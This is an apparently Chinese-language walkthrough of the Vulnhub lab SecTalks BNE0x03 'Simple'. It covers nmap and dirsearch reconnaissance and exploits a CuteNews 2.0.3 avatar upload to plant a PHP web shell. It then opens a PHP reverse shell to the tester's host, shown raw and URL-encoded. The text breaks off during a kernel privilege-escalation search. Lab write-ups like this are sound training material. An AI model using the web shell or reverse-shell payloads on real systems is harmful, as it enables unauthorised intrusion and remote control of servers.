{"pageProps":{"postData":{"id":"VulnhubSecTalks：BNE0x03 - Simple","contentHtml":"<h1>SecTalks：BNE0x03 - Simple</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/\">https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>170</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-30 13:38 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.170</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.000088</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B4:EA:<span class=\"hljs-number\">57</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.171</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B4:EA:<span class=\"hljs-number\">57</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00022</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:EC:C5:<span class=\"hljs-title function_ invoke__\">A4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.170</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-30 13:39 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.170</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00075</span>s latency).\nNot shown: <span class=\"hljs-number\">65534</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B4:EA:<span class=\"hljs-number\">57</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p80 <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.170</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-30 13:42 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.170</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00056</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">7</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B4:EA:<span class=\"hljs-number\">57</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.170</span>\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-csrf:\n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.170\n|   Found the following possible CSRF vulnerabilities:\n|\n|     Path: http://192.168.75.170:80/\n|     Form id: login_form\n|     Form action: /index.php\n|\n|     Path: http://192.168.75.170:80/index.php\n|     Form id: login_form\n|     Form action: /index.php\n|\n|     Path: http://192.168.75.170:80/?register&#x26;lostpass\n|     Form id:\n|     Form action: /index.php\n|\n|     Path: http://192.168.75.170:80/?register\n|     Form id: regpassword\n|     Form action: /index.php?register\n|\n|     Path: http://192.168.75.170:80/index.php?register\n|     Form id: regpassword\n|_    Form action: /index.php?register\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n|_http-vuln-cve2017-<span class=\"hljs-number\">1001000</span>: ERROR: Script execution failed (use -d to debug)\n| http-slowloris-check:\n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">6750</span>\n|       Slowloris tries to keep many connections to the target web server <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> hold\n|       them <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">as</span> long <span class=\"hljs-keyword\">as</span> possible.  It accomplishes this by opening connections to\n|       the target web server <span class=\"hljs-keyword\">and</span> sending a partial request. By doing so, it starves\n|       the http serve<span class=\"hljs-string\">r's resources causing Denial Of Service.\n|\n|     Disclosure date: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n| http-enum:\n|   /rss.php: RSS or Atom feed\n|   /core/: Potentially interesting directory w/ listing on '</span>apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.7</span> (ubuntu)<span class=\"hljs-string\">'\n|   /docs/: Potentially interesting directory w/ listing on '</span>apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.7</span> (ubuntu)<span class=\"hljs-string\">'\n|_  /uploads/: Potentially interesting directory w/ listing on '</span>apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.7</span> (ubuntu)<span class=\"hljs-string\">'\nMAC Address: 00:0C:29:B4:EA:57 (VMware)\n\n</span></code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>先扫描吧</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.170</span> -x <span class=\"hljs-number\">403</span>\n//\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">50</span>] Starting:\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  314B  - /core  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.170</span>/core/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">16</span>] <span class=\"hljs-number\">301</span> -  314B  - /docs  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.170</span>/docs/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">16</span>] <span class=\"hljs-number\">200</span> -  507B  - /docs/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -    4KB - /example.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> -    1KB - /favicon.ico\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">22</span>] <span class=\"hljs-number\">200</span> -    1KB - /index.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">22</span>] <span class=\"hljs-number\">200</span> -    1KB - /index.php/login/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">25</span>] <span class=\"hljs-number\">200</span> -    1KB - /LICENSE.txt\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">200</span> -   28B  - /<span class=\"hljs-built_in\">print</span>.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">37</span>] <span class=\"hljs-number\">200</span> -    2KB - /README.md\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">200</span> -  118B  - /rss.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">200</span> -  758B  - /search.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">42</span>] <span class=\"hljs-number\">301</span> -  315B  - /skins  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.170</span>/skins/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">301</span> -  317B  - /uploads  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.170</span>/uploads/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">200</span> -  408B  - /uploads/\n</code></pre>\n<ul>\n<li><code>/uploads/</code> 应该是一个上传目录</li>\n<li>通过README等来看，CMS能确定是<code>CuteNews 2.0.3</code></li>\n</ul>\n</li>\n<li>\n<p>查阅CMS是否存在漏洞</p>\n<p><code>searchsploit</code> 扫描出任意文件上传漏洞</p>\n<pre><code class=\"hljs language-python\">searchsploit CuteNews <span class=\"hljs-number\">2.0</span><span class=\"hljs-number\">.3</span>\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                              |  Path\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nCuteNews <span class=\"hljs-number\">2.0</span><span class=\"hljs-number\">.3</span> - Arbitrary File Upload                                                                                                                                                      | php/webapps/<span class=\"hljs-number\">37474.</span>txt\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre>\n<p>拉取下来，跟着步骤走</p>\n<pre><code class=\"hljs language-python\">          CuteNews <span class=\"hljs-number\">2.0</span><span class=\"hljs-number\">.3</span> Remote File Upload Vulnerability\n        =================================================\n<span class=\"hljs-number\">1</span>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">0</span>     _                   __           __       __                     <span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">1</span>   /<span class=\"hljs-string\">' \\            __  /'</span>__`\\        /\\ \\__  /<span class=\"hljs-string\">'__`\\                   0\n0  /\\_, \\    ___   /\\_\\/\\_\\ \\ \\    ___\\ \\ ,_\\/\\ \\/\\ \\  _ ___           1\n1  \\/_/\\ \\ /'</span> _ `\\ \\/\\ \\/_/_\\_&#x3C;_  /<span class=\"hljs-string\">'___\\ \\ \\/\\ \\ \\ \\ \\/\\`'</span>__\\          <span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">0</span>     \\ \\ \\/\\ \\/\\ \\ \\ \\ \\/\\ \\ \\ \\/\\ \\__/\\ \\ \\_\\ \\ \\_\\ \\ \\ \\/           <span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">1</span>      \\ \\_\\ \\_\\ \\_\\_\\ \\ \\ \\____/\\ \\____\\\\ \\__\\\\ \\____/\\ \\_\\           <span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">0</span>       \\/_/\\/_/\\/_/\\ \\_\\ \\/___/  \\/____/ \\/__/ \\/___/  \\/_/           <span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">1</span>                  \\ \\____/ >> Exploit database separated by exploit   <span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">0</span>                   \\/___/          <span class=\"hljs-built_in\">type</span> (local, remote, DoS, etc.)    <span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">1</span>                                                                      <span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">0</span>  [+] Site            : Inj3ct0r.com                                  <span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">1</span>  [+] Support e-mail  : submit[at]inj3ct0r.com                        <span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">0</span>                                                                      <span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">1</span>               <span class=\"hljs-comment\">##########################################             1</span>\n<span class=\"hljs-number\">0</span>               I<span class=\"hljs-string\">'m T0x!c member from Inj3ct0r Team             1\n1               ##########################################             0\n0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1\n\n# Exploit Title: CuteNews 2.0.3 Remote File Upload Vulnerability\n# Date: [02/07/2015]\n# Exploit Author: [T0x!c]\n# Facebook: https://www.facebook.com/Dz.pr0s\n# Vendor Homepage: [http://cutephp.com/]\n# Software Link: [http://cutephp.com/cutenews/cutenews.2.0.3.zip]\n# Version: [2.0.3]\n# Tested on: [Windows 7]\n# greetz to :Tr00n , Kha&#x26;mix , Cc0de  , Ghosty , Ked ans , Caddy-dz .....\n==========================================================\n # Exploit  :\n\nVuln : http://127.0.0.1/cutenews/index.php?mod=main&#x26;opt=personal\n\n 1 - Sign up for New User\n 2 - Log In\n 3 - Go to Personal options http://www.target.com/cutenews/index.php?mod=main&#x26;opt=personal\n 4 - Select Upload Avatar Example: Evil.jpg\n 5 - use tamper data  &#x26; Rename File Evil.jpg to Evil.php\n\n-----------------------------2847913122899\\r\\nContent-Disposition: form-data; name=\"avatar_file\"; filename=\"Evil.php\"\\r\\\n\n6 - Your Shell : http://127.0.0.1/cutenews/uploads/avatar_Username_FileName.php\n\n Example: http://127.0.0.1/cutenews/uploads/avatar_toxic_Evil.php                  \n</span></code></pre>\n</li>\n<li>\n<p>尝试利用CMS漏洞</p>\n<ul>\n<li>\n<p>注册新用户</p>\n<p>随便填一下，我填的<code>sunset</code> <code>Aa118811</code></p>\n</li>\n<li>\n<p>登陆进去来到 <code>Dashboard</code> > <code>Personal options</code></p>\n</li>\n<li>\n<p>上传图片马然后抓包修改文件后缀为 <code>.php</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># shell2.jpg</span>\nGIF89a\n&#x3C;?php system($_GET[<span class=\"hljs-string\">'a'</span>]); ?>\n</code></pre>\n<pre><code class=\"hljs language-python\">-----------------------------<span class=\"hljs-number\">228896324810094846214215287044</span>\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"avatar_file\"</span>; filename=<span class=\"hljs-string\">\"shell2.php\"</span>  //修改后缀名\nContent-<span class=\"hljs-type\">Type</span>: image/png\n\nGIF89a\n&#x3C;?php system($_GET[<span class=\"hljs-string\">'a'</span>]); ?>\n-----------------------------<span class=\"hljs-number\">228896324810094846214215287044</span>\n</code></pre>\n<p>CMS提示<code>upload successfully</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>在 <code>Dashboard</code> > <code>Personal options</code> 复制头像链接，然后加上<code>a</code>参数尝试</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># /uploads/avatar_sunset_shell2.php?a=ls</span>\nGIF89a avatar_sunset_shell2.php \n</code></pre>\n<p>成功，我们执行反弹<code>shell</code>代码，同时<code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">php -r <span class=\"hljs-string\">'$sock=fsockopen(\"192.168.75.151\",1234);exec(\"/bin/sh -i &#x3C;&#x26;3 >&#x26;3 2>&#x26;3\");'</span>\n</code></pre>\n<p>注意进行<code>URL</code>编码</p>\n<pre><code class=\"hljs language-python\">/uploads/avatar_sunset_shell2.php?a=%<span class=\"hljs-number\">70</span>%<span class=\"hljs-number\">68</span>%<span class=\"hljs-number\">70</span>%<span class=\"hljs-number\">20</span>%2d%<span class=\"hljs-number\">72</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">24</span>%<span class=\"hljs-number\">73</span>%6f%<span class=\"hljs-number\">63</span>%6b%3d%<span class=\"hljs-number\">66</span>%<span class=\"hljs-number\">73</span>%6f%<span class=\"hljs-number\">63</span>%6b%6f%<span class=\"hljs-number\">70</span>%<span class=\"hljs-number\">65</span>%6e%<span class=\"hljs-number\">28</span>%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">31</span>%<span class=\"hljs-number\">39</span>%<span class=\"hljs-number\">32</span>%2e%<span class=\"hljs-number\">31</span>%<span class=\"hljs-number\">36</span>%<span class=\"hljs-number\">38</span>%2e%<span class=\"hljs-number\">37</span>%<span class=\"hljs-number\">35</span>%2e%<span class=\"hljs-number\">31</span>%<span class=\"hljs-number\">35</span>%<span class=\"hljs-number\">31</span>%<span class=\"hljs-number\">22</span>%2c%<span class=\"hljs-number\">31</span>%<span class=\"hljs-number\">32</span>%<span class=\"hljs-number\">33</span>%<span class=\"hljs-number\">34</span>%<span class=\"hljs-number\">29</span>%3b%<span class=\"hljs-number\">65</span>%<span class=\"hljs-number\">78</span>%<span class=\"hljs-number\">65</span>%<span class=\"hljs-number\">63</span>%<span class=\"hljs-number\">28</span>%<span class=\"hljs-number\">22</span>%2f%<span class=\"hljs-number\">62</span>%<span class=\"hljs-number\">69</span>%6e%2f%<span class=\"hljs-number\">73</span>%<span class=\"hljs-number\">68</span>%<span class=\"hljs-number\">20</span>%2d%<span class=\"hljs-number\">69</span>%<span class=\"hljs-number\">20</span>%3c%<span class=\"hljs-number\">26</span>%<span class=\"hljs-number\">33</span>%<span class=\"hljs-number\">20</span>%3e%<span class=\"hljs-number\">26</span>%<span class=\"hljs-number\">33</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">32</span>%3e%<span class=\"hljs-number\">26</span>%<span class=\"hljs-number\">33</span>%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">29</span>%3b%<span class=\"hljs-number\">27</span>\n</code></pre>\n<p>获得<code>shell</code></p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n$ whoami\nwww-data\n$ uname -a\nLinux simple <span class=\"hljs-number\">3.16</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">30</span>-generic <span class=\"hljs-comment\">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>敏感信息搜索，没找到扫描有用的信息</p>\n</li>\n<li>\n<p>尝试内核提权</p>\n<pre><code class=\"hljs language-python\">searchsploit Linux Kernel <span class=\"hljs-number\">3.16</span><span class=\"hljs-number\">.0</span> | grep Local\n//\nLinux Kernel (Solaris <span class=\"hljs-number\">10</span> / &#x3C; <span class=\"hljs-number\">5.10</span> <span class=\"hljs-number\">138888</span>-01) - Local Privilege Escalation                                                                                                                   | solaris/local/<span class=\"hljs-number\">15962.</span>c\nLinux Kernel <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.19</span> &#x3C; <span class=\"hljs-number\">5.9</span> - <span class=\"hljs-string\">'Netfilter Local Privilege Escalation                                                                                                                           | linux/local/50135.c\nLinux Kernel 3.11 &#x3C; 4.8 0 - '</span>SO_SNDBUFFORCE<span class=\"hljs-string\">' / '</span>SO_RCVBUFFORCE<span class=\"hljs-string\">' Local Privilege Escalation                                                                                                  | linux/local/41995.c\nLinux Kernel 3.13.0 &#x3C; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - '</span>overlayfs<span class=\"hljs-string\">' Local Privilege Escalation                                                                                        | linux/local/37292.c\nLinux Kernel 3.13.0 &#x3C; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - '</span>overlayfs<span class=\"hljs-string\">' Local Privilege Escalation (Access /etc/shadow)                                                                   | linux/local/37293.txt\nLinux Kernel 4.8.0 UDEV &#x3C; 232 - Local Privilege Escalation                                                                                                                                  | linux/local/41886.c\nLinux Kernel &#x3C; 3.16.1 - '</span>Remount FUSE<span class=\"hljs-string\">' Local Privilege Escalation                                                                                                                           | linux/local/34923.c\nLinux Kernel &#x3C; 3.16.39 (Debian 8 x64) - '</span>inotfiy<span class=\"hljs-string\">' Local Privilege Escalation                                                                                                                | linux_x86-64/local/44302.c\nLinux Kernel &#x3C; 4.10.13 - '</span>keyctl_set_reqkey_keyring<span class=\"hljs-string\">' Local Denial of Service                                                                                                                | linux/dos/42136.c\nLinux Kernel &#x3C; 4.11.8 - '</span>mq_notify: double sock_put()<span class=\"hljs-string\">' Local Privilege Escalation                                                                                                           | linux/local/45553.c\nLinux Kernel &#x3C; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                                               | linux/local/45010.c\nLinux Kernel &#x3C; 4.14.rc3 - Local Denial of Service                                                                                                                                           | linux/dos/42932.c\nLinux Kernel &#x3C; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                                      | linux/local/44298.c\nLinux Kernel &#x3C; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class=\"hljs-string\">' Local Privilege Escalation                                                                                           | linux_x86-64/local/44300.c\nLinux Kernel &#x3C; 4.4.0-83 / &#x3C; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                                       | linux/local/43418.c\nLinux Kernel &#x3C; 4.4.0/ &#x3C; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                                   | linux/local/47169.c\n</span></code></pre>\n<p>尝试了几个无法提权，使用 <code>Ubuntu 14.04</code> 进行搜索</p>\n<pre><code class=\"hljs language-python\">searchsploit Ubuntu <span class=\"hljs-number\">14.04</span>\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                              |  Path\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nApport (Ubuntu <span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">14.10</span>/<span class=\"hljs-number\">15.04</span>) - Race Condition Privilege Escalation                                                                                                                     | linux/local/<span class=\"hljs-number\">37088.</span>c\nApport <span class=\"hljs-number\">2.14</span><span class=\"hljs-number\">.1</span> (Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-number\">.2</span>) - Local Privilege Escalation                                                                                                                                 | linux/local/<span class=\"hljs-number\">36782.</span>sh\nApport <span class=\"hljs-number\">2.</span>x (Ubuntu Desktop <span class=\"hljs-number\">12.10</span> &#x3C; <span class=\"hljs-number\">16.04</span>) - Local Code Execution                                                                                                                            | linux/local/<span class=\"hljs-number\">40937.</span>txt\nLinux Kernel (Debian <span class=\"hljs-number\">7.7</span>/<span class=\"hljs-number\">8.5</span>/<span class=\"hljs-number\">9.0</span> / Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-number\">.2</span>/<span class=\"hljs-number\">16.04</span><span class=\"hljs-number\">.2</span>/<span class=\"hljs-number\">17.04</span> / Fedora <span class=\"hljs-number\">22</span>/<span class=\"hljs-number\">25</span> / CentOS <span class=\"hljs-number\">7.3</span><span class=\"hljs-number\">.1611</span>) - <span class=\"hljs-string\">'ldso_hwcap_64 Stack Clash'</span> Local Privilege Escalation                                  | linux_x86-<span class=\"hljs-number\">64</span>/local/<span class=\"hljs-number\">42275.</span>c\nLinux Kernel (Debian <span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">10</span> / Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-number\">.5</span>/<span class=\"hljs-number\">16.04</span><span class=\"hljs-number\">.2</span>/<span class=\"hljs-number\">17.04</span> / Fedora <span class=\"hljs-number\">23</span>/<span class=\"hljs-number\">24</span>/<span class=\"hljs-number\">25</span>) - <span class=\"hljs-string\">'ldso_dynamic Stack Clash'</span> Local Privilege Escalation                                                         | linux_x86/local/<span class=\"hljs-number\">42276.</span>c\nLinux Kernel (Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-number\">.3</span>) - <span class=\"hljs-string\">'perf_event_open()'</span> Can Race <span class=\"hljs-keyword\">with</span> execve() (Access /etc/shadow)                                                                                             | linux/local/<span class=\"hljs-number\">39771.</span>txt\nLinux Kernel <span class=\"hljs-number\">3.13</span><span class=\"hljs-number\">.0</span> &#x3C; <span class=\"hljs-number\">3.19</span> (Ubuntu <span class=\"hljs-number\">12.04</span>/<span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">14.10</span>/<span class=\"hljs-number\">15.04</span>) - <span class=\"hljs-string\">'overlayfs'</span> Local Privilege Escalation                                                                                        | linux/local/<span class=\"hljs-number\">37292.</span>c\nLinux Kernel <span class=\"hljs-number\">3.13</span><span class=\"hljs-number\">.0</span> &#x3C; <span class=\"hljs-number\">3.19</span> (Ubuntu <span class=\"hljs-number\">12.04</span>/<span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">14.10</span>/<span class=\"hljs-number\">15.04</span>) - <span class=\"hljs-string\">'overlayfs'</span> Local Privilege Escalation (Access /etc/shadow)                                                                   | linux/local/<span class=\"hljs-number\">37293.</span>txt\nLinux Kernel <span class=\"hljs-number\">3.</span>x (Ubuntu <span class=\"hljs-number\">14.04</span> / Mint <span class=\"hljs-number\">17.3</span> / Fedora <span class=\"hljs-number\">22</span>) - Double-free usb-midi SMEP Privilege Escalation                                                                                    | linux/local/<span class=\"hljs-number\">41999.</span>txt\nLinux Kernel <span class=\"hljs-number\">4.3</span><span class=\"hljs-number\">.3</span> (Ubuntu <span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">15.10</span>) - <span class=\"hljs-string\">'overlayfs'</span> Local Privilege Escalation (<span class=\"hljs-number\">1</span>)                                                                                                        | linux/local/<span class=\"hljs-number\">39166.</span>c\nLinux Kernel <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span> (Ubuntu <span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">16.04</span> x86-<span class=\"hljs-number\">64</span>) - <span class=\"hljs-string\">'AF_PACKET'</span> Race Condition Privilege Escalation                                                                                            | linux_x86-<span class=\"hljs-number\">64</span>/local/<span class=\"hljs-number\">40871.</span>c\nLinux Kernel <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">21</span> &#x3C; <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">51</span> (Ubuntu <span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">16.04</span> x64) - <span class=\"hljs-string\">'AF_PACKET'</span> Race Condition Privilege Escalation                                                                                 | windows_x86-<span 